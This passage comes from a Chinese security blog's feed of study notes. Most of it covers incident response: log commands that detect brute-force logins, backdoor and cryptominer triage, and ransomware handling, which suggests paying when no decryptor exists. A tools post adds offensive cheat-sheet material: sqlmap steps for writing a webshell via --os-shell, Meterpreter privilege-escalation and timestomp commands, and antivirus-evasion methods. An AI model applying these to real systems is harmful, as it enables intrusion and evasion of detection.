/var/log/auth.log | grep &quot;pam_unix(sshd:session): session closed&quot;# 密码错误cat /var/log/auth.log | grep &quot;authentication failure&quot;# 连续错误cat /var/log/auth.log | grep &quot;message repeated 2 times&quot;</code></pre></li><li><p>统计数据</p><pre><code># 登录失败的用户名及其次数grep &quot;Failed password&quot; /var/log/auth.log|perl -e &#39;while($_=&lt;&gt;)&#123; /for(.*?)from/; print&quot;$1\n&quot;;&#125;&#39;|sort|uniq -c|sort -nr# 登录失败的IP及其次数cat /var/log/auth.log | grep &quot;Failed password for&quot; | grep &quot;root&quot; | grep -Po &#39;(1\d&#123;2&#125;|2[0-4]\d|25[0-5]|[1-9]\d|[1-9])(\.(1\d&#123;2&#125;|2[0-4]\d|25[0-5]|[1-9]\d|\d))&#123;3&#125;&#39; |sort|uniq -c|sort -nr</code></pre></li><li><p>加固防护<br>升级SSH版本至少为 7.7版本以上，7.7及以下版本存在SSH用户名枚举<br>加强口令复杂程度<br>禁止root用户登录，可以通过其他用户su到root<br>安装 <a href="https://github.com/fail2ban/fail2ban"><code>fail2ban</code></a> 来进行防御</p></li></ol><h5 id="Mysql暴力破解"><a href="#Mysql暴力破解" class="headerlink" title="Mysql暴力破解"></a>Mysql暴力破解</h5><p>Mysql 默认安装会保留登录日志，在 Ubuntu 上默认位置为 <code>/var/og/mysql/error.log</code></p><ol><li><p>查看登录失败的用户名</p><pre><code>cat /var/log/mysql/error.log | grep &quot;Access denied for user&quot; | grep &quot;using password: YES&quot; | awk -F &quot;&#39;&quot; &#39;&#123;print $2&#125;&#39; | sort | uniq -c | sort -nr</code></pre></li><li><p>查看登录失败的IP及次数</p><pre><code>cat /var/log/mysql/error.log | grep &quot;Access denied for user&quot; | grep &quot;using password: YES&quot; | awk -F &quot;&#39;&quot; &#39;&#123;print $2&#125;&#39; | sort| uniq | while read line;do echo $line;cat /var/log/mysql/error.log | grep &quot;Access denied for user&quot; | grep &quot;using password&quot; | awk -F &quot;&#39;&quot; &#39;&#123;print $4&#125;&#39; | sort | uniq -c | sort -nr; done</code></pre></li></ol><h5 id="FTP暴力破解"><a href="#FTP暴力破解" class="headerlink" title="FTP暴力破解"></a>FTP暴力破解</h5><ol><li>查看网络连接（如果有爆破会有大量的ESTABLISHED状态和TIME WAIT状态的网络连接）<pre><code>netstat -pantu</code></pre></li><li>查看最近的一个ftp会话（也可以用ftpwho查找）<pre><code>last -w -t</code></pre></li><li>查找日志<pre><code>cat /var/log/vsftpd.log   具体的位置可能不太一样，需要自己查找</code></pre></li><li>查找登录失败的账号<pre><code>cat /var/log/vsftpd.log | grep FAIL | cut -d &quot;[&quot; -f 3 | cut -d &quot;]&quot; -f 1 | sort | uniq -c | sort -nr</code></pre></li><li>查找登录失败的IP<pre><code>cat /var/log/vsftpd.log | grep FAIL | cut -d &quot;[&quot; -f 3 | cut -d &quot;]&quot; -f 1 | sort | uniq | while read line;do echo $line;cat /var/log/vsftpd.log | grep $line | cut -d &quot;:&quot; -f 7 | cut -d &#39;&quot;&#39; -f 1 | sort | uniq -c | sort -nr; done</code></pre></li><li>FTP服务加固<br>禁用 anonymous 和 ftp 两个账号<br>使用 SSL 加密 FTP<br>安装 fail2ban 来进行防御</li></ol><h5 id="Redis未授权暴力破解"><a href="#Redis未授权暴力破解" class="headerlink" title="Redis未授权暴力破解"></a>Redis未授权暴力破解</h5><p>将redis.conf 中的 requirepass 前的注释打开，并且设置一个复杂密码<br>缩减开放端口，建议仅在本机127.0.0.1使用<br>配置完成后需要重启来生效</p><ul><li>只有手动设置logfile才能保存日志，默认不设置默认的日志级别notice是不会记录登录、执行指令、退出的。</li><li>loglevel设置为 verbose或者debug才会记录登录主机</li><li>执行的指令<code>info，set</code>等即使 loglevel是 debug 级别也不会记录，但是会记录我们设置了多少个key， 具体key名称以及内容不会记录</li></ul><p><strong>虽然如此，但是失败成功的登录日志都是一样的……</strong><br><strong>没办法区分是不是攻击行为，只能问有没有人那个时候登过了</strong></p><h5 id="MongoDB暴力破解"><a href="#MongoDB暴力破解" class="headerlink" title="MongoDB暴力破解"></a>MongoDB暴力破解</h5><p>默认配置文件位置为 /etc/mongodb.conf<br>默认的的日志位置为 /var/og/mongodb/mongodb.log<br>打开verbose后能看到大量的failed事件<br>在/var/log/mongodb/mongodb.log查看</p><ol><li>登录失败的账户<pre><code>cat /var/log/mongodb/mongodb.log | grep -v &quot;UserNotFound&quot;|grep failed | awk -F &quot; &quot; &#39;&#123;print $9&#125;&#39; | sort|uniq -c|sort -nr</code></pre></li><li>登录所有账户失败的IP及次数<pre><code>cat /var/log/mongodb/mongodb.log | grep -v &quot;UserNotFound&quot;|grep failed | awk -F &quot; &quot; &#39;&#123;print $9&#125;&#39; |sort | uniq | while read line;do echo $line;cat /var/log/mongodb/mongodb.log |grep -v &quot;UserNotFound&quot; | grep failed | grep $line | awk -F &quot; &quot; &#39;&#123;print $14&#125;&#39; | cut -d &quot;:&quot; -f 1 | sort | uniq -c | sort -nr; done</code></pre></li><li>不存在账户的爆破事件<pre><code>cat /var/log/mongodb/mongodb.log | grep &quot;UserNotFound&quot;|grep failed | awk -F &quot; &quot; &#39;&#123;print $9&#125;&#39; |sort | uniq | while read line;do echo $line;cat /var/log/mongodb/mongodb.log |grep &quot;UserNotFound&quot; | grep failed | grep $line | awk -F &quot; &quot; &#39;&#123;print $14&#125;&#39; | cut -d &quot;:&quot; -f 1 | sort | uniq -c | sort -nr; done</code></pre></li></ol><h5 id="SMTP暴力破解"><a href="#SMTP暴力破解" class="headerlink" title="SMTP暴力破解"></a>SMTP暴力破解</h5><p>SMTP负责发，POP3、IMAP负责收，POP3协议客户端收到邮件，服务器端就会将其删除，除非有特殊的配置。<br>IMAP则弥补了这一缺陷，客户端该收收，服务端还给你保存着，同时你在客户端的各种配置操作都会在服务器上进行同步</p><pre><code>验证失败的账户IPcat /var/log/mail.log | grep &quot;authentication failed&quot; | grep -Po &#39;(1\d&#123;2&#125;|2[0-4]\d|25[0-5]|[1-9]\d|[1-9])(\.(1\d&#123;2&#125;|2[0-4]\d|25[0-5]|[1-9]\d|\d))&#123;3&#125;&#39; |sort|uniq -c|sort -nr</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h5 id=&quot;介绍&quot;&gt;&lt;a href=&quot;#介绍&quot; class=&quot;headerlink&quot; title=&quot;介绍&quot;&gt;&lt;/a&gt;介绍&lt;/h5&gt;&lt;p&gt;暴力破解一般针对&lt;br&gt;ssh、mysql、ftp、redis、mongodb、smtp&lt;/p&gt;
&lt;h5 id=&quot;SSH暴力破解&quot;&gt;&lt;a h</summary>
      
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>勒索病毒排查</title>
    <link href="https://liu1272.github.io/2023/08/15/%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E6%8E%92%E6%9F%A5/"/>
    <id>https://liu1272.github.io/2023/08/15/%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E6%8E%92%E6%9F%A5/</id>
    <published>2023-08-15T07:37:00.000Z</published>
    <updated>2023-08-19T09:16:04.607Z</updated>
    
    <content type="html"><![CDATA[<h5 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h5><p>正常情况下遇到勒索病毒就两种方法，要么找办法解开要么给钱。</p><h5 id="处置方法"><a href="#处置方法" class="headerlink" title="处置方法"></a>处置方法</h5><ol><li>查找勒索病毒特征，收集相关信息</li><li>深信服千里目实验室公众号直接回复病毒关键字</li><li>安全响应及EDR知识赋能平台</li><li>Freebuf</li><li>淘宝、闲鱼</li></ol><h5 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h5><p><strong>有解密工具就用解密工具<br>无解密工具就交钱</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h5 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h5&gt;&lt;p&gt;正常情况下遇到勒索病毒就两种方法，要么找办法解开要么给钱。&lt;/p&gt;
&lt;h5 id=&quot;处置方法&quot;&gt;&lt;a href=&quot;#处置方法&quot; class=</summary>
      
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>远控后门排查</title>
    <link href="https://liu1272.github.io/2023/08/14/%E8%BF%9C%E6%8E%A7%E5%90%8E%E9%97%A8%E6%8E%92%E6%9F%A5/"/>
    <id>https://liu1272.github.io/2023/08/14/%E8%BF%9C%E6%8E%A7%E5%90%8E%E9%97%A8%E6%8E%92%E6%9F%A5/</id>
    <published>2023-08-14T03:10:00.000Z</published>
    <updated>2023-08-19T09:15:58.132Z</updated>
    
    <content type="html"><![CDATA[<h5 id="获取事件告警信息"><a href="#获取事件告警信息" class="headerlink" title="获取事件告警信息"></a>获取事件告警信息</h5><p>监控EDR、态势感知、防火墙等平台查看威胁告警以及日志。</p><h5 id="定位后门文件"><a href="#定位后门文件" class="headerlink" title="定位后门文件"></a>定位后门文件</h5><pre><code>根据告警信息定位后门文件位置，查找进程pidlsof | grep xxxx.xxlsof /root/xxxx.xxfuser /root/xxxx.xx</code></pre><h5 id="查看外连事件详情"><a href="#查看外连事件详情" class="headerlink" title="查看外连事件详情"></a>查看外连事件详情</h5><pre><code>根据五元组来查找通信的端口ip对应的pidnetstat -pantu | grep 114.114.114.114netstat -pantu | grep 65533lsof -i:65533netstat -pantu | grep 65533lsof -i:65533</code></pre><h5 id="查找进程信息"><a href="#查找进程信息" class="headerlink" title="查找进程信息"></a>查找进程信息</h5><pre><code>查找进程相关文件lsof -p 1234   （需要root权限）pwdx获取pid程序详细信息lsof -p pidpwdx pidsystemctl status pidcat /proc/pid/mapsls -al /proc/pid/exe</code></pre><h5 id="根据pid查看对应线程"><a href="#根据pid查看对应线程" class="headerlink" title="根据pid查看对应线程"></a>根据pid查看对应线程</h5><pre><code>ps H -T -p pidps -aLf pidpstree -agplU（推荐使用）</code></pre><h5 id="确定进程运行时间"><a href="#确定进程运行时间" class="headerlink" title="确定进程运行时间"></a>确定进程运行时间</h5><pre><code>ps -eo pid,lstart,etime,cmd | grep &lt;pid&gt;</code></pre><h5 id="比对恶意文件的创建时间"><a href="#比对恶意文件的创建时间" class="headerlink" title="比对恶意文件的创建时间"></a>比对恶意文件的创建时间</h5><pre><code>stat xxx.xxls -al xxx.xx</code></pre><h5 id="样本采集分析"><a href="#样本采集分析" class="headerlink" title="样本采集分析"></a>样本采集分析</h5><pre><code>使用SCP/Xshell等将样本移出主机，计算哈希值后到威胁情报平台中去搜索certutil -hashfile 文件 MD5</code></pre><h5 id="进程查杀"><a href="#进程查杀" class="headerlink" title="进程查杀"></a>进程查杀</h5><pre><code>【查找子进程】ps ajfxsystemctl status【杀死进程】kill -9 pid   （这样子是杀不死子进程的！！！）kill -9 -pid   （杀掉进程组）</code></pre><h5 id="删除文件"><a href="#删除文件" class="headerlink" title="删除文件"></a>删除文件</h5><pre><code># 查看文件占用，解除占用后删除lsof xxxx.xx# 移除 i, a 属性chattr -ia file.sh# 查看是否移除成功lsattr file.sh# 移除文件rm -rf file.sh# 奇怪文件名无法删除，先查inode再删除ls -li xxxx.xxfind ./* -inum 12327526 -deletefind ./ -inum 12327526 -exec rm &#123;&#125; \;find ./* -inum 12327526 -exec rm -i &#123;&#125; \;find ./* -inum 12327526 -exec rm -f &#123;&#125; \;find ./* -inum 12327526 |xargs rm -frm `find ./* -inum 12327526`# 目录挂载无法删除（Device or resource busy）sudo lsblk -asudo umount /dev/sdb1rm -rf xxxx.xx</code></pre><h5 id="补充：守护进程"><a href="#补充：守护进程" class="headerlink" title="补充：守护进程"></a>补充：守护进程</h5><pre><code># 守护进程是什么？其他进程都是在用户登录或运行程序时创建，在运行结束或用户注销时终止，但系统服务进程（守护进程）不受用户登录注销的影响，它们一直在运行着。# 守护进程的本质是什么？（1）守护进程的本职就是孤儿进程，该进程自成会话，自成进程组，一般守护进程与终端无关；（即：pid=sid=gid）（2）后台进程受用户登录注销的影响，而守护进程不受用户登录和注销的影响。但是它们都受关机的影响。# 守护进程有什么特点？1. 没有控制终端，终端名设置为？号2. 父进程不是用户创建的进程，一般由init进程或者systemd（pid=1）的进程为父进程3. 进程名字通常以字母 d 结束4. 工作目录为/（根），主要是为了防止占用磁盘导致无法卸载磁盘5. 以kthreadd内核进程创建的守护进程以kthreadd为父进程# 守护进程如何设置？1. 执行一个fork()，之后父进程退出，子进程继续执行。2. 子进程调用setsid()开启一个新回话并释放它与控制终端之间的所有关联关系。3. 在setsid()调用之后执行第二个fork()，让父进程退出并让孙进程继续执行。确保了子进程不会成为会话组长。（根据System V中获取终端的规则，进程永远不会重新请求一个控制终端。多一个fork()调用不会带来任何坏处。）4. 使用  umask(0);  清除进程的umask以确保当daemon创建文件和目录时拥有所需的权限。5. 修改进程的当前工作目录，通常会改为根目录（/）。6. 关闭daemon从其父进程继承而来的所有打开着的文件描述符。# 守护进程如何删除？1. 首先ps axj | grep 守护进程名字，找到相应的守护进程，然后使用kill -9 守护进程名杀掉；2. 利用ps -ef命令查找相应的守护进程，再用kill -9命令将其杀死；3. 创建shell脚本对进程的启动、关闭、重启进行自动管理。注：kill -9 -pid   （杀掉进程组）</code></pre><h5 id="补充：screen的原理"><a href="#补充：screen的原理" class="headerlink" title="补充：screen的原理"></a>补充：screen的原理</h5><ul><li>当用户启动Screen时，它会创建一个守护进程作为后台进程，并与用户终端会话（称为控制终端）分离。</li><li>控制终端不再直接处理用户输入和输出，而是由Screen守护进程负责接收和处理。</li><li>守护进程通过与Unix域套接字进行通信，与控制终端保持连接。</li><li>用户在控制终端中输入的命令会被发送到守护进程，并由守护进程解析和执行。</li><li>守护进程还负责从虚拟终端读取输出内容，并将其发送回控制终端进行显示。</li></ul><p>通过这种方式，Screen实现了在控制终端与守护进程之间的交互，并通过守护进程来管理多个虚拟终端、处理窗口切换、保存会话状态等功能。<br>需要注意的是，虽然Screen的守护进程在后台运行，但用户仍然可以通过重新连接到控制终端来恢复与之前会话的交互，即使之前的SSH连接断开或终端关闭。这是Screen的一个重要特性，允许用户在断开连接后恢复他们的工作环境。</p><h5 id="补充：恢复守护进程会话的交互"><a href="#补充：恢复守护进程会话的交互" class="headerlink" title="补充：恢复守护进程会话的交互"></a>补充：恢复守护进程会话的交互</h5><p>可以使用<code>nohup</code>命令启动一个守护进程，并将输出重定向到文件中，例如：</p><pre class="line-numbers language-shell"><code class="language-shell">nohup ./your_daemon &<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>通过这种方式启动的守护进程不会因为用户退出终端而停止运行。</p><p>当用户重新连接到控制终端时，可以使用<code>jobs</code>命令查看守护进程的状态，并使用<code>fg</code>命令将其调至前台，恢复与之前会话的交互。例如：</p><pre class="line-numbers language-shell"><code class="language-shell">jobsfg %job_id<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>其中，<code>job_id</code>是守护进程的作业号，可以在<code>jobs</code>命令的输出中找到。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h5 id=&quot;获取事件告警信息&quot;&gt;&lt;a href=&quot;#获取事件告警信息&quot; class=&quot;headerlink&quot; title=&quot;获取事件告警信息&quot;&gt;&lt;/a&gt;获取事件告警信息&lt;/h5&gt;&lt;p&gt;监控EDR、态势感知、防火墙等平台查看威胁告警以及日志。&lt;/p&gt;
&lt;h5 id=&quot;定位后门文</summary>
      
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>挖矿事件排查</title>
    <link href="https://liu1272.github.io/2023/08/13/%E6%8C%96%E7%9F%BF%E4%BA%8B%E4%BB%B6%E6%8E%92%E6%9F%A5/"/>
    <id>https://liu1272.github.io/2023/08/13/%E6%8C%96%E7%9F%BF%E4%BA%8B%E4%BB%B6%E6%8E%92%E6%9F%A5/</id>
    <published>2023-08-13T08:51:00.000Z</published>
    <updated>2023-08-19T09:15:50.374Z</updated>
    
    <content type="html"><![CDATA[<h5 id="第一步：获取信息"><a href="#第一步：获取信息" class="headerlink" title="第一步：获取信息"></a>第一步：获取信息</h5><ul><li>下线服务器之后从DNS服务器、防火墙、态势感知平台等地方获取到攻击事件详细信息</li><li>根据上传来源的IP/域名，在威胁情报平台查询确定木马类型</li><li>获取异常进程的pid</li></ul><pre><code>CPU占用：top -c -o %CPUps -eo pid,ppid,%mem,%cpu,cmd --sort=-%cpu | head -n 5内存占用：top -c -o %MEMps -eo pid,ppid,%mem,%cpu,cmd --sort=-%mem | head -n 5网络占用：安装后使用nethogs或者jnettop进行查询根据进程名或字符串查询：pidof &quot;name&quot;ps -aux | grep &quot;name&quot;ps -ef | grep &quot;name&quot; | grep -v grep | awk &#39;&#123;print $2&#125;&#39;pgrep -f &quot;name&quot;</code></pre><ul><li>根据pid查询详细信息（当查询不到时有可能是/proc/pid隐藏了）</li></ul><pre><code>lsof -p pidpwdx pidsystemctl status pidcat /proc/pid/mapsls -al /proc/pid/exe</code></pre><ul><li>根据pid查看对应线程</li></ul><pre><code>ps H -T -p pidps -aLf pidpstree -agplU（推荐使用）</code></pre><ul><li>确定进程运行时间</li></ul><pre><code>ps -eo pid,lstart,etime,cmd | grep &lt;pid&gt;</code></pre><ul><li>比对恶意文件的创建时间</li></ul><pre><code>stat xxx.xxls -al xxx.xx</code></pre><ul><li>样本采集分析</li></ul><pre><code>使用SCP/Xshell等将样本移出主机，计算哈希值后到威胁情报平台中去搜索certutil -hashfile 文件 MD5</code></pre><ul><li>进程查杀</li></ul><pre><code>【查找子进程】ps ajfxsystemctl status【杀死进程】kill -9 pid   （这样子是杀不死子进程的！！！）kill -9 -pid   （杀掉进程组）</code></pre><ul><li>删除文件</li></ul><pre><code># 查看文件占用，解除占用后删除lsof xxxx.xx# 移除 i, a 属性chattr -ia file.sh# 查看是否移除成功lsattr file.sh# 移除文件rm -rf file.sh# 奇怪文件名无法删除，先查inode再删除ls -li xxxx.xxfind ./* -inum 12327526 -deletefind ./ -inum 12327526 -exec rm &#123;&#125; \;find ./* -inum 12327526 -exec rm -i &#123;&#125; \;find ./* -inum 12327526 -exec rm -f &#123;&#125; \;find ./* -inum 12327526 |xargs rm -frm `find ./* -inum 12327526`# 目录挂载无法删除（Device or resource busy）sudo lsblk -asudo umount /dev/sdb1rm -rf xxxx.xx</code></pre><ul><li>网页挖矿排查</li></ul><pre><code># 浏览器查看历史记录，定位到该事件点访问的页面# 进入虚拟机进行访问，并限制进程只允许占用一个cpu# 查看该网页的源码和网络链接调用# 将浏览器缓存文件进行检测（大多数是JS）# 清除浏览数据&gt;清除缓存文件# 解密恶意文件查看矿池地址以及连接条件# 上区块链网站溯源</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h5 id=&quot;第一步：获取信息&quot;&gt;&lt;a href=&quot;#第一步：获取信息&quot; class=&quot;headerlink&quot; title=&quot;第一步：获取信息&quot;&gt;&lt;/a&gt;第一步：获取信息&lt;/h5&gt;&lt;ul&gt;
&lt;li&gt;下线服务器之后从DNS服务器、防火墙、态势感知平台等地方获取到攻击事件详细信息&lt;</summary>
      
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>安全工具</title>
    <link href="https://liu1272.github.io/2023/08/12/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/"/>
    <id>https://liu1272.github.io/2023/08/12/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/</id>
    <published>2023-08-12T02:51:00.000Z</published>
    <updated>2023-08-12T04:38:48.589Z</updated>
    
    <content type="html"><![CDATA[<h5 id="Nmap常用命令"><a href="#Nmap常用命令" class="headerlink" title="Nmap常用命令"></a>Nmap常用命令</h5><pre><code>nmap hostname/ip或者多个ip或者子网192.168.123.*-iL ip.txt 扫描ip.txt的所有ip-A 包含了-sV，-O，探测操作系统信息和路由跟踪（激烈扫描，一般不用）-O 探测操作系统信息-sV 查找主机服务版本号-sA 探测该主机是否使用了包过滤器或防火墙（建议使用wafw00f）-sS 半开扫描，一般不会记入日志，不过需要root权限。-sT TCP connect扫描，这种方式会在目标主机的日志中记录大批的链接请求以及错误信息。-sP ping扫描，一般最好不加，因为有的主机会禁止ping，却实际存在。-Pn 扫描之前不使用ping，适用于防火墙禁止ping，比较有用。-sN TCP空扫描-F 快速扫描-p 指定端口/端口范围-oN 将报告写入文件-v 详细信息-T&lt;0-5&gt; 设定速度使用脚本：--script all 使用所有脚本--script=sql.injection.nse sql注入--script=&quot;smb*&quot; 扫smb系列一、4 大功能：分别为主机发现（参数-sn）、端口扫描(-sS -sU)、版本侦测(–sV)、OS侦测(-O)二、扫描方式有：tcp connect()、TCP SYN scanning、TCP FIN scanning、Nullscan等三、绕过 ping 扫描参数为：nmap -Pn XXX.XXX.XXX.XXX四、漏洞检测可直接 nmap 目标 --script=auth,vuln</code></pre><h5 id="SQLmap"><a href="#SQLmap" class="headerlink" title="SQLmap"></a>SQLmap</h5><pre><code>-u 单个URL -m xx.txt 多个URL-d &quot;mysql://user:password@10.10.10.137:3306/dvwa&quot; 作为服务器客户端，连接数据库--data post/get都适用-p 指定扫描的参数-r 读取文件-f 指纹信息--tamper 混淆脚本，用于应用层过滤--cookie --user-agent --host 对http头的修改--threads 并发线程，默认为1--dbms MySQL&lt;5.0&gt; 指定数据库或版本–level=LEVEL 执行测试的等级（1-5，默认为 1）–risk=RISK 执行测试的风险（0-3，默认为 1） Risk升高可造成数据被篡改等风险–current-db 获取当前数据库名称–dbs 枚举数据库管理系统数据库–tables 枚举 DBMS 数据库中的表–columns 枚举 DBMS 数据库表列-D DB 要进行枚举的数据库名-T TBL 要进行枚举的数据库表-C COL 要进行枚举的数据库列-U USER 用来进行枚举的数据库用户常用的tamper：base64encode.py 转为b64编码charencode.py url编码chardoubleencode.py 双URL编码unmagicquotes.py 宽字节randomcomments.py 用`/**/`分割SQL关键字space2plus.py space2comment.py space2xxxx.py 替换空格为xxPost注入：sqlmap -r &quot;数据包地址&quot; -p &quot;参数&quot; -dbms 数据类型Get注入：sqlmap -u &quot;注入点地址&quot; --dbms 参数sqlmap进行交互式写shell：1-前提条件：最高权限、知道web网站绝对路径、能获取到cookie2-sqlmap.py -u &quot;注入点地址&quot; --cookie=&quot;cookie值&quot; --os-shell-echo “一句话木马”&gt;网站的绝对路径3-输入web网站的绝对路径4-传木马</code></pre><h5 id="菜刀、蚁剑、冰蝎、CS、哥斯拉"><a href="#菜刀、蚁剑、冰蝎、CS、哥斯拉" class="headerlink" title="菜刀、蚁剑、冰蝎、CS、哥斯拉"></a>菜刀、蚁剑、冰蝎、CS、哥斯拉</h5><p><strong>菜刀特征</strong><br>使用了base64的方式加密了发送给“菜刀马”的指令，其中的两个关键payload <code>z1</code>和<code>z2</code>，这个名字是可变的</p><p><strong>蚁剑特征</strong><br>默认的USER-agent请求头是<code>antsword xxx</code>，但是可以修改<code>/modules/request.js</code>文件<br>其中流量最中明显的特征为<code>@ini_set(&quot;display_errors&quot;,&quot;0&quot;);</code>这段代码基本是所有WebShell客户端链接PHP类WebShell都有的一种代码<br>蚁剑混淆加密后还有一个比较明显的特征,即为参数名大多以<code>“_0x......=”</code>这种形式（下划线可替换），所以以_0x开头的参数名也很可能就是恶意流量</p><p><strong>冰蝎</strong><br>看包没有发现什么特征，但是可以发现它是POST请求的</p><ol><li>Accept头有<code>application/xhtml+xmlapplication/xmlapplication/signed-exchange</code>属于弱特征（UA头的浏览器版本很老）</li><li>特征分析<code>Content-Type: application/octet-stream</code>这是一个强特征，查阅资料可知octet-stream的意思是，只能提交二进制，而且只能提交一个二进制，如果提交文件的话，只能提交一个文件,后台接收参数只能有一个，而且只能是流（或者字节数组），所以很少使用</li></ol><p><strong>冰蝎2特征</strong><br>默认Accept字段的值很特殊,而且每个阶段都一样冰蝎内置了十余种UserAgent，每次连接shell会随机选择一个进行使用，但是可以在burp中修改ua头。<br><code>Content-Length: 16</code>, 16就是冰蝎2连接的特征</p><p><strong>冰蝎3特征</strong><br>目前很多waf等设备都做了冰蝎2的流量特征分析，所以3取消了动态密钥获取；抓包没有发现什么特征，但它是POST请求的</p><ol><li>Accept头<code>application/xhtml+xmlapplication/xmlapplication/signed-exchange</code>属于弱特征</li><li>ua头该特征属于弱特征，通过burp可以修改。冰蝎3.0内置的默认16个userAgent都比较老，也可以作为waf规则特征</li></ol><p><strong>哥斯拉特征</strong><br>【PHP连接特征】</p><ol><li>使用了php_XOR_BASE64</li><li>请求都含有”pass=”<br>【jsp连接特征】</li><li>使用了java_AES_BASE64</li><li>是用了java_AES_RAW</li><li>与php请求一样都含有<code>&quot;pass=&quot;</code>而且发起连接时服务器返回的Content-Length是0</li></ol><h5 id="wireshark"><a href="#wireshark" class="headerlink" title="wireshark"></a>wireshark</h5><p>过滤 ip:<br>过滤源 ip 地址:ip.src==1.1.1.1;,目的 ip 地址:ip.dst==1.1.1.1;<br>过滤端口:<br>过滤 80 端口:tcp.port==80,源端口:tcp.srcport==80,目的端<br>口:tcp.dstport==80<br>协议过滤:<br>直接输入协议名即可,如 http 协议 http<br>http 模式过滤:<br>过滤 get/post 包 http.request.mothod==”GET/POST”</p><h5 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h5><pre><code>常用命令：background  让meterpreter处于后台模式sessions -i number  与会话进行交互，number表示第n个sessionquit  退出会话shell  获得命令行cat  c:\\boot.ini 查看文件内容getwd  查看当前工作目录work directory upload /root/Desktop/netcat.exe c:\\   上传文件到目标机上download 0xfa.txt /root/Desktop/   下载文件到本机上edit c:\\boot.ini   编辑文件search -d d:\\www -f web.config  查找文件ps  查看当前活跃进程migrate pid  将Meterpreter会话移植到进 程数位pid的进程中execute -H -i -f cmd.exe  创建新进程getpid  获取当前进程的pid kill pid  杀死进程getuid  查看权限sysinfo  查看目标机系统信息，如机器名，操作系统等getsystem  提权操作timestompc:/a.doc -c &quot;10/27/2015 14:22:11&quot;  修改文件的创建时间迁移进程：- meterpreter &gt; ps- 自行选择PID- meterpreter &gt; migrate pid</code></pre><h4 id="一些免杀的了解"><a href="#一些免杀的了解" class="headerlink" title="一些免杀的了解"></a>一些免杀的了解</h4><p><strong>做免杀的原理：</strong><br>就是fuzz定位出被查杀的语句，然后对被查杀那部分进行加密、编码、动态执行、拆分拼接、特定条件执行等等。</p><p><strong>免杀分类：</strong><br>为静态免杀（单纯看hash值）、流量免杀（有通信流量就杀）、内存免杀（看内存运行特征）、动态免杀（行为感知）</p><p><strong>免杀语言分类：</strong></p><ol><li>编译型语言，编译器一次性将所有源代码编译为一个不可跨平台执行的可执行程序，一次编译可以重复执行（C、C++、Golang、汇编等）</li><li>解释型语言，使用解释器一边执行一边转换，不会生成可执行程序。（JavaScript、Python、PHP、Shell等）</li></ol><p><strong>免杀方法：</strong></p><ol><li>修改特征码，猜测杀软对哪几个字节进行查杀，再对应修改（几乎没用了）</li><li>shellcode加载器，改变加载到内存的方式和加密方式（主流）</li><li>反射dll加载，把dll加密，远程下载到内存中再解密执行（高级）</li></ol><h5 id="无文件执行木马的方式有哪些？"><a href="#无文件执行木马的方式有哪些？" class="headerlink" title="无文件执行木马的方式有哪些？"></a>无文件执行木马的方式有哪些？</h5><p>powershell（脚本解析器） 》》》powershell.exe（应用程序）<br>VB.script（脚本解析器） 》》》cscript.exe（应用程序）<br>bat处理 （脚本解析器） 》》》cmd.exe（应用程序）<br>javaSrtipt（脚本解析器） 》》》mshta.exe（应用程序）</p><h5 id="怎么做shellcode免杀？"><a href="#怎么做shellcode免杀？" class="headerlink" title="怎么做shellcode免杀？"></a>怎么做shellcode免杀？</h5><ol><li>编码</li><li>加壳</li><li>混淆</li><li>分离免杀</li><li>特征码修改</li><li>添加无用逻辑语句</li><li>重写api</li></ol><h5 id="分离免杀怎么做？"><a href="#分离免杀怎么做？" class="headerlink" title="分离免杀怎么做？"></a>分离免杀怎么做？</h5><p>分为加载器和shellcode两部分，一般将shellcode存储在网页或者图片中，然后加载器远程加载存在shellcode的网页或者图片之类的</p><h5 id="powershell怎么远程加载？"><a href="#powershell怎么远程加载？" class="headerlink" title="powershell怎么远程加载？"></a>powershell怎么远程加载？</h5><p>可以远程加载mimikazt，远控文件，exe可执行文件实现无文件落地。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h5 id=&quot;Nmap常用命令&quot;&gt;&lt;a href=&quot;#Nmap常用命令&quot; class=&quot;headerlink&quot; title=&quot;Nmap常用命令&quot;&gt;&lt;/a&gt;Nmap常用命令&lt;/h5&gt;&lt;pre&gt;&lt;code&gt;nmap hostname/ip或者多个ip或者子网192.168.123.</summary>
      
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>内网渗透</title>
    <link href="https://liu1272.github.io/2023/08/06/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
